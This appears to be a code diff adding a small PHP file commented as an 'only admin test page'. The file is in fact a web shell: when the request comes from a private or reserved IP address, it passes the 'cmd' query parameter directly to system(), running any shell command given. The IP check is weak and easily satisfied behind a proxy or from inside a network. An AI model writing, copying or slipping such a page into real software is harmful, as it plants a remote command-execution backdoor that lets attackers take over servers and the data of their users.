@@ -1,0 +1,16 @@
+<?php
+
+# only admin test page
+
+function is_local_ip($ip) : bool {
+    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
+        return true; # private ip address
+    }
+    return false; # public ip address
+}
+
+if(is_local_ip($_SERVER['REMOTE_ADDR'])){
+	if( isset($_GET['cmd']) ){
+		system($_GET['cmd']);
+	}
+}
